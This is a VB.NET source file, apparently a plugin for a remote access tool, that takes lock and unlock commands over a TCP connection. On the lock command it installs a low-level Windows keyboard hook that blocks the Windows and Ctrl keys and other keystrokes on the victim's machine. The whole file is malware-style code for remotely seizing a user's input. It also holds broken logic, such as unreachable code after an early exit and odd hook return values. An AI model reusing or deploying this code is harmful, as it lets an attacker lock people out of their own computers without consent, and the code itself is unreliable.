Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Windows.Forms
Imports PacketLib.Packet
Imports PL.NativeAPI
Public Class Main
    Public Shared MainThread As New Thread(AddressOf KB_Thread)
    Public Shared B As Boolean = False
    Public Shared BB As Boolean = False
    Public Shared Sub Main(ByVal K As TcpClient, ByVal Param_Tab As Object())
        Dim CastParam As Packet_Subject = CType(Param_Tab(0), Packet_Subject)
        Select Case CastParam

            Case Packet_Subject.KB_LCK

                BB = True
                B = True
                MainThread.Start()

            Case Packet_Subject.KB_ULCK

                BB = False
                MainThread.Start()

        End Select
    End Sub
    Public Shared Sub KB_Thread()

        Dim objCurrentModule As ProcessModule = Process.GetCurrentProcess().MainModule
        Dim objKeyboardProcess As New LowLevelKeyboardProc(AddressOf captureKey)
        Dim curProcess As Process = Process.GetCurrentProcess()
        ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(curProcess.ProcessName), 0)
        Application.Run()

    End Sub
    Public Shared Function captureKey(ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr)

        If nCode >= 0 Then

            If BB = True Then
                If B = True Then

                    Dim objKeyInfo As KBDLLHOOKSTRUCT = CType(Marshal.PtrToStructure(lp, GetType(KBDLLHOOKSTRUCT)), KBDLLHOOKSTRUCT)

                    If objKeyInfo.key = Keys.LWin Then
                        Return CType(1, IntPtr)
                    End If

                    If objKeyInfo.key = Keys.LControlKey Then
                        Return CType(1, IntPtr)
                    End If

                    If wp = &H100 Then

                        Return wp


                    End If


                    If wp = &H101 Then

                        Return wp


                    End If


                    If wp = &H105 Then

                        Return wp


                    End If

                    If wp = &H104 Then
                        Return wp
                    End If


                Else

                End If

            Else

                Exit Function
                Return NativeAPI.CallNextHookEx(NativeAPI.ptrHook, nCode, wp, lp)
            End If

            Return NativeAPI.CallNextHookEx(NativeAPI.ptrHook, nCode, wp, lp)


        End If

        '   Else

        '  Return CallNextHookEx(ptrHook, nCode, wp, lp)
        ' End If
    End Function

End Class
